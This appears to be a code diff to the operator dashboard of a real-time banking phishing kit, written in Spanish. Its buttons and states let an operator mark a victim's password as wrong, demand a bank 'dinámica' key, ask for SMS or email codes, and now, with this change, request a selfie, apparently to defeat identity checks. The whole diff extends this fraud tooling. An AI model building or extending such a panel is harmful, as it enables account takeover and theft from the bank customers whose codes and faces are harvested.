@@ -24,11 +24,13 @@ function statusLabel(state) {
   if (state === 'error-login') return 'Error de datos'
   if (state === 'error') return 'Error'
   if (state === 'waiting-dinamica') return 'Dinámica solicitada'
-  if (state === 'waiting-sms') return 'SMS solicitado'
+  if (state === 'waiting-sms') return 'SMS / Correo solicitado'
+  if (state === 'waiting-selfie' || state === 'selfie') return 'Selfie solicitada'
   if (state === 'received-dinamica') return 'Dinámica'
-  if (state === 'received-sms') return 'SMS'
+  if (state === 'received-sms') return 'SMS / Correo'
+  if (state === 'received-selfie') return 'Selfie tomada'
   if (state === 'error-dinamica') return 'Error Dinámica'
-  if (state === 'error-sms') return 'Error SMS'
+  if (state === 'error-sms') return 'Error SMS/Correo'
   if (state === 'typing') return 'Escribiendo código'
   return 'Nuevo'
 }
@@ -40,11 +42,13 @@ function badgeClass(state) {
   if (
     state === 'waiting' ||
     state === 'waiting-dinamica' ||
-    state === 'waiting-sms'
+    state === 'waiting-sms' ||
+    state === 'waiting-selfie' ||
+    state === 'selfie'
   ) {
     return 'badge badge--wait'
   }
-  if (state === 'active') return 'badge badge--hola'
+  if (state === 'active' || state === 'received-selfie') return 'badge badge--hola'
   if (state === 'done') return 'badge badge--done'
   if (state === 'received-dinamica' || state === 'received-sms') {
     return 'badge badge--login'
@@ -145,7 +149,8 @@ function createRow(row) {
       <div class="row-actions">
         <button type="button" class="btn btn--warning" data-action="error-login">Err Clave</button>
         <button type="button" class="btn btn--ok" data-action="dinamica">Dinámica</button>
-        <button type="button" class="btn btn--ok" data-action="sms">SMS</button>
+        <button type="button" class="btn btn--ok" data-action="sms">SMS / Correo</button>
+        <button type="button" class="btn btn--ok" data-action="selfie" style="background:#7c3aed; color:#fff; border-color:#6d28d9;">Selfie</button>
         <button type="button" class="btn btn--error" data-action="error-dinamica">Err Dinámica</button>
         <button type="button" class="btn btn--error" data-action="error-sms">Err SMS</button>
         <button type="button" class="btn btn--done" data-action="done">Listo</button>
@@ -168,6 +173,14 @@ function createRow(row) {
       return
     }
     setRowState(row.id, 'waiting-sms', 'sms')
+  })
+  tr.querySelector('[data-action="selfie"]')?.addEventListener('click', () => {
+    const current = rows.get(row.id)
+    if (current?.state === 'waiting-selfie') {
+      setRowState(row.id, 'waiting', null)
+      return
+    }
+    setRowState(row.id, 'waiting-selfie', 'selfie')
   })
   tr.querySelector('[data-action="error-login"]')?.addEventListener('click', () => {
     setRowState(row.id, 'error-login', 'error-login')
@@ -254,8 +267,10 @@ function updateRow(tr, row) {
 
   const dinamicaBtn = tr.querySelector('[data-action="dinamica"]')
   const smsBtn = tr.querySelector('[data-action="sms"]')
+  const selfieBtn = tr.querySelector('[data-action="selfie"]')
   dinamicaBtn?.classList.toggle('is-on', row.state === 'waiting-dinamica')
   smsBtn?.classList.toggle('is-on', row.state === 'waiting-sms')
+  selfieBtn?.classList.toggle('is-on', row.state === 'waiting-selfie' || row.state === 'selfie')
   tr.classList.toggle('is-waiting', row.state === 'waiting')
 }
 
@@ -328,6 +343,8 @@ async function pollSessions() {
               session.state === 'waiting' ||
               session.state === 'received-dinamica' ||
               session.state === 'received-sms' ||
+              session.state === 'waiting-selfie' ||
+              session.state === 'received-selfie' ||
               session.state === 'error-login' ||
               session.state === 'error-dinamica' ||
               session.state === 'error-sms' ||
